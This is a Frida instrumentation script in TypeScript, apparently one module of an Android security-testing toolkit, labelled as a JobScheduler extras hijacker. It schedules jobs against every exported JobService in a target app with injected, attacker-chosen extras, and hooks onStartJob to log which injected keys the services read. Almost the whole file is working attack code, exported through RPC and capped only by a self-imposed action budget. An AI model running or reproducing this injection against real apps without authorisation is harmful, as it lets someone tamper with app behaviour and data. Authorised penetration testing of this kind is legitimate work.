/*
 * D_064 — JobScheduler extras hijacker.
 *
 * Builds a JobInfo targeting each exported JobService with the
 * hijacked PersistableBundle extras, schedules it, then hooks
 * JobService.onStartJob to record whether the hijacked extras
 * were actually read by the service.
 */

import { Java } from "../lib/java_ready.js";
import { sendError } from "../lib/send.js";

interface JobPayload {
    hijack_extras: Record<string, any>;
    exported_job_services: string[];
    safety_budget?: any;
}
interface JobResult {
    scheduled: number;
    services_invoked: { service: string; read_extras: string[] }[];
    duration_ms: number;
}

async function jobhijacker(payload: JobPayload): Promise<JobResult> {
    const max = Math.min(payload.safety_budget?.max_actions_total ?? 10, 20);
    const window_s = payload.safety_budget?.wall_clock_budget_s ?? 30;
    let scheduled = 0;
    const invoked: any[] = [];
    const start = Date.now();

    return new Promise((resolve) => {
        Java.perform(() => {
            try {
                const ActivityThread = Java.use("android.app.ActivityThread");
                const ctx = ActivityThread.currentApplication().getApplicationContext();
                const JS = ctx.getSystemService("jobscheduler");
                const JobInfoBuilder = Java.use("android.app.job.JobInfo$Builder");
                const ComponentName = Java.use("android.content.ComponentName");
                const PB = Java.use("android.os.PersistableBundle");
                const pkg = ctx.getPackageName();

                // Hook onStartJob to observe what got read
                const Service = Java.use("android.app.job.JobService");
                Service.onStartJob.implementation = function (params: any) {
                    try {
                        const cls = String(this.getClass().getName());
                        const extras = params.getExtras();
                        const read: string[] = [];
                        for (const k of Object.keys(payload.hijack_extras)) {
                            try {
                                if (extras.containsKey(k)) read.push(k);
                            } catch (_) { /* ignore */ }
                        }
                        invoked.push({ service: cls, read_extras: read });
                    } catch (_) { /* ignore */ }
                    return this.onStartJob(params);
                };

                const services = payload.exported_job_services.slice(0, max);
                services.forEach((svc, i) => {
                    if (Date.now() - start >= window_s * 1000) return;
                    try {
                        const cn = ComponentName.$new(pkg, svc);
                        const bundle = PB.$new();
                        for (const [k, v] of Object.entries(payload.hijack_extras)) {
                            if (typeof v === "string") bundle.putString(k, v);
                            else if (typeof v === "number") bundle.putInt(k, v | 0);
                            else if (typeof v === "boolean")
                                bundle.putString(k, v ? "true" : "false");
                        }
                        const jobInfo = JobInfoBuilder.$new(9000 + i, cn)
                            .setExtras(bundle)
                            .setOverrideDeadline(0)
                            .build();
                        JS.schedule(jobInfo);
                        scheduled++;
                    } catch (_) { /* refused */ }
                });
            } catch (e: any) {
                sendError(`D_064: ${e.message}`);
            }
            setTimeout(() => resolve({
                scheduled,
                services_invoked: invoked,
                duration_ms: Date.now() - start,
            }), window_s * 1000);
        });
    });
}

rpc.exports = { jobhijacker };
